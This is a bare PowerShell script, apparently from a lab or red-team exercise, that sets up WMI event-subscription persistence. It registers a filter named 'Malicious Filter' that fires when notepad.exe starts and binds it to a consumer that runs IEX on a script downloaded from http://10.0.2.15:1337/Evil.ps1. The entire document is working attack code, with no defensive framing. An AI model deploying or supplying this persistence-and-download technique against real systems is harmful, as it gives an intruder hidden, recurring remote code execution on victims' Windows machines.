$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
	EventNamespace = 'root/CIMV2'
	Name = 'Malicious Filter'
	Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "notepad.exe"'
	QueryLanguage = 'WQL'
}

$Command = "powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)"

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
	Name = "Malicious Consumer"
	CommandLineTemplate = $Command
}

Set-WmiInstance -Name root\subscription -Class __FilterToConsumerBinding -Arguments @{
	Filter = $Filter
	Consumer = $Consumer
}